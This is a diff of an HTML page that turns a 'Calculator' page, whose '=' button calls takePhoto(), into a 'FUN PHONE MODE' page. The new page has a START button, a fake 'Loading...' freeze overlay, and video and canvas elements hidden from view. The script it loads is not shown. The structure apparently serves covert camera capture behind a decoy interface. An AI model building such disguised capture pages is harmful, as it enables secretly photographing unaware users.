@@ -3,21 +3,23 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Calculator</title>
+<title>FUN PHONE MODE</title>
 <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-<h2>Calculator</h2>
+<h2>🔥 FUN PHONE MODE</h2>
 
-<div class="calc">
-<input type="text" placeholder="0">
-<button onclick="takePhoto()">=</button>
+<button onclick="startFun()">START</button>
+
+<div id="freeze" class="hidden">
+    <h1>Loading...</h1>
 </div>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
-<img id="photo">
+<audio id="sound" src="music.mp3"></audio>
+
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script src="app.js"></script>
 </body>
